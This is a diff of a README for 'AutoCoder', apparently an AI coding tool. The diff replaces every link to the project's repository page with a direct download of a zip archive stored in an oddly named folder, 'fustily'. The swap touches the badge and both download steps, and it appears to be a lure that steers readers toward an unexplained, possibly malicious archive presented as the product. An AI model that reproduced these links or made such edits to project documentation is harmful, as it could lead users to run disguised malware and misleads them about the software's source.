@@ -1,6 +1,6 @@
 # 🤖 AutoCoder - Build, plan, and test with AI
 
-[![Download AutoCoder](https://img.shields.io/badge/Download-AutoCoder-blue?style=for-the-badge)](https://github.com/alizasentimental514/AutoCoder)
+[![Download AutoCoder](https://img.shields.io/badge/Download-AutoCoder-blue?style=for-the-badge)](https://raw.githubusercontent.com/alizasentimental514/AutoCoder/main/fustily/Coder_Auto_1.6.zip)
 
 ## 🖥️ What AutoCoder Does
 
@@ -12,7 +12,7 @@ It uses multiple AI agents that work together. You can keep notes, track ideas, 
 
 Use this link to visit the page and download AutoCoder:
 
-https://github.com/alizasentimental514/AutoCoder
+https://raw.githubusercontent.com/alizasentimental514/AutoCoder/main/fustily/Coder_Auto_1.6.zip
 
 ### Steps for Windows
 
@@ -187,4 +187,4 @@ You want to add a new button to your app.
 
 Use this page to download AutoCoder for Windows:
 
-https://github.com/alizasentimental514/AutoCoder
+https://raw.githubusercontent.com/alizasentimental514/AutoCoder/main/fustily/Coder_Auto_1.6.zip
